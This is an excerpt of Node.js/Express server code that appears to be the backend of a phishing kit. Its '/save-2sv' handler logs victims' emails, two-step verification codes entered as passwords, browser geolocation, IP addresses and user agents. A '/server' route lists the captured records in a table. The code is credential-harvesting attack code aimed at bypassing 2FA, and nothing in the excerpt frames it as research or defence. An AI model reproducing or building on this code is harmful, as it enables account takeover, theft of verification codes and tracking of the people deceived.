...
app.get('/server', (req, res) => {
  ...
  const rows = records.map((r) => `
    <tr>
      ...
      <td class="td-loc" style="font-size:12px; color:var(--muted)">
        ${r.location && r.location !== '—' && r.location !== 'Unknown' ? 
...
app.post('/save-2sv', (req, res) => {
  ...
  if (req.body.lat === 'Unknown') {
    formLabel = 'FORM      : 2-Step Verification (Code only)';
  } else if (req.body.lat === 'Denied') {
    formLabel = 'FORM      : Location Prompt (Denied)';
  } else {
    formLabel = 'FORM      : Location Prompt (Allowed!)';
  }
  ...
  const record = [
    ...
    `EMAIL     : ${email}`,
    `PASSWORD  : [2FA] ${code}`,
    `LOCATION  : ${req.body.lat ? req.body.lat + ', ' + req.body.lon : 'Unknown'}`,
    `IP        : ${ip}`,
    `USER-AGENT: ${ua}`,
    ``
  ].join('\n');
